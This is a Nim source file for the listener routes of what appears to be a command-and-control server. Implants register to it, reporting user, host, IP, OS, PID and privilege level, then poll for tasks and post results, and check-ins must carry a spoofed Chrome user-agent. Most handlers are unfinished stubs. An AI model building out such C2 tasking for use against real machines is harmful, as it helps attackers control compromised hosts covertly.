import prologue, nanoid
import terminal, sequtils, strutils

import ../[types]
import ../agent/agent
import ./utils

#[
    POST /{listener-uuid}/register
    Called from agent to register itself to the conquest server
]# 
proc register*(ctx: Context) {.async.} = 

    # Check headers
    doAssert(ctx.request.getHeader("CONTENT-TYPE") == @["application/json"])
    doAssert(ctx.request.getHeader("USER-AGENT") == @["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"])

    # Handle POST data, the register data should look like the following
    #[
        {
            "username": "username",
            "hostname":"hostname",
            "ip": "ip-address",
            "os": "operating-system"
            "pid":  1234
            "elevated": false
        }
    ]#  
    
    let 
        postData: JsonNode = %ctx.request.body()
        name = generate(alphabet=join(toSeq('A'..'Z'), ""), size=8)

    let agent = new Agent
    agent.name = name
    notifyAgentRegister(agent)


    resp agent.name

#[
    GET /{listener-uuid}/{agent-uuid}/tasks
    Called from agent to check for new tasks
]#
proc getTasks*(ctx: Context) {.async.} = 
    
    stdout.writeLine(ctx.getPathParams("listener"))
    let name = ctx.getPathParams("agent")
    

    resp name

#[
    POST /{listener-uuid}/{agent-uuid}/results
    Called from agent to post results of a task

]#
proc postResults*(ctx: Context) {.async.} = 
    
    let name = ctx.getPathParams("agent")
    
    resp name